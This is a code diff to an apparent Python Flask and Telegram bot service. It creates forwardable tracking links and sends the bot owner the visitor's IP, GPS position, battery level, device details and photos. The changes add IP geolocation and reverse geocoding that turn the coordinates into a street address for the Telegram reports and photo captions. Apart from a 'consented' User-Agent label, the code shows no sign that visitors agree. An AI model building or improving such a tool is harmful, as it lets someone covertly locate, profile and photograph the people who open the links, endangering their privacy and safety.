@@ -54,7 +54,7 @@ def save_sessions(sessions):
 SESSIONS = load_sessions()
 
 
-# ---------- Telegram helpers ----------
+# ---------- Helpers ----------
 def telegram_api(method: str, data=None, files=None, timeout=30):
     if not TELEGRAM_BOT_TOKEN:
         return None, "no_token"
@@ -93,7 +93,6 @@ def tg_send_photo(chat_id: str, photo_path: str, caption: str = None):
         return False
 
 
-# ---------- Helpers ----------
 def is_valid_http_url(u: str):
     try:
         p = urlparse(u)
@@ -126,6 +125,46 @@ def extract_client_ip(raw_ip: str):
         return "unknown"
     parts = [p.strip() for p in raw_ip.split(",") if p.strip()]
     return parts[0] if parts else raw_ip
+
+
+def geoip_lookup(ip: str):
+    if not ip or ip == "unknown":
+        return None
+    try:
+        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=2)
+        if resp.ok:
+            return resp.json()
+        print("GeoIP non-ok:", resp.status_code, resp.text[:200])
+    except Exception as e:
+        print("GeoIP lookup failed:", e)
+    return None
+
+
+def reverse_geocode_from_coords(coords: dict):
+    """
+    Best-effort reverse geocode to human-readable address from GPS coordinates.
+    Uses OpenStreetMap Nominatim.
+    """
+    if not isinstance(coords, dict):
+        return None
+    lat = coords.get("lat")
+    lon = coords.get("lon")
+    if lat is None or lon is None:
+        return None
+    try:
+        resp = requests.get(
+            "https://nominatim.openstreetmap.org/reverse",
+            params={"lat": lat, "lon": lon, "format": "jsonv2"},
+            headers={"User-Agent": "consented-session-bot/1.0"},
+            timeout=3,
+        )
+        if resp.ok:
+            j = resp.json()
+            return j.get("display_name") or None
+        print("Reverse geocode non-ok:", resp.status_code, resp.text[:200])
+    except Exception as e:
+        print("Reverse geocode failed:", e)
+    return None
 
 
 # ---------- Basic endpoints ----------
@@ -195,7 +234,6 @@ def wrap_create():
     save_sessions(SESSIONS)
     link = url_for("wrapper_page", token=token, _external=True)
     if chat_id:
-        # reply with only ONE link (easy to forward)
         tg_send_text(chat_id, link)
     return jsonify({"token": token, "link": link})
 
@@ -220,24 +258,15 @@ def upload_info(token):
     payload = request.get_json(silent=True) or {}
     battery = payload.get("battery")
     coords = payload.get("coords")
-    details = payload.get("details")  # full extra data bundle from JS
+    details = payload.get("details")
     note = payload.get("note")
 
     raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     ip = extract_client_ip(raw_ip)
     timestamp = datetime.utcnow().isoformat()
 
-    # GeoIP enrichment (basic, external API)
-    geo = None
-    try:
-        if ip not in ("unknown", None, ""):
-            resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=2)
-            if resp.ok:
-                geo = resp.json()
-            else:
-                print("GeoIP non-ok:", resp.status_code, resp.text[:200])
-    except Exception as e:
-        print("GeoIP lookup failed:", e)
+    geo = geoip_lookup(ip)
+    human_address = reverse_geocode_from_coords(coords) if coords else None
 
     entry = {
         "timestamp": timestamp,
@@ -247,6 +276,7 @@ def upload_info(token):
         "details": details,
         "geo": geo,
         "note": note,
+        "address": human_address,
     }
 
     SESSIONS[token].setdefault("visits", []).append(entry)
@@ -299,7 +329,7 @@ def upload_info(token):
         country = geo.get("country_name") or geo.get("country") or "unknown"
         isp = geo.get("org") or geo.get("asn") or "unknown"
 
-    # Extra device details from JS
+    # Device details from JS
     d = details or {}
     ua = d.get("userAgent", "") or ""
     platform = d.get("platform") or ""
@@ -344,6 +374,9 @@ def upload_info(token):
         f"🔋 Battery: {bat_txt}",
         f"📍 GPS: {loc_txt}",
     ]
+
+    if human_address:
+        lines.append(f"🏠 Address: {human_address}")
 
     device_line = f"📱 Device: {os_browser}" if os_browser else "📱 Device: unknown"
     lines.append(device_line)
@@ -484,13 +517,30 @@ def upload_image(token):
         else:
             loc_txt = "unknown"
 
-        caption = (
-            f"📷 Session {token} — PHOTO\n"
-            f"⏱ Time: {timestamp}\n"
-            f"🌍 IP: {ip}\n"
-            f"🔋 Battery: {bat_txt}\n"
-            f"📍 GPS: {loc_txt}"
-        )
+        # GeoIP + address also for photo caption (best effort)
+        geo = geoip_lookup(ip)
+        city = region = country = isp = "unknown"
+        if isinstance(geo, dict):
+            city = geo.get("city") or "unknown"
+            region = geo.get("region") or geo.get("region_code") or "unknown"
+            country = geo.get("country_name") or geo.get("country") or "unknown"
+            isp = geo.get("org") or geo.get("asn") or "unknown"
+
+        human_address = reverse_geocode_from_coords(coords) if coords else None
+
+        caption_lines = [
+            f"📷 Session {token} — PHOTO",
+            f"⏱ Time: {timestamp}",
+            f"🌍 IP: {ip}",
+            f"🏙 GeoIP: {city}, {region}, {country}",
+            f"🏢 ISP: {isp}",
+            f"🔋 Battery: {bat_txt}",
+            f"📍 GPS: {loc_txt}",
+        ]
+        if human_address:
+            caption_lines.append(f"🏠 Address: {human_address}")
+
+        caption = "\n".join(caption_lines)
 
         sent = tg_send_photo(chat_id, path, caption=caption)
         if not sent:
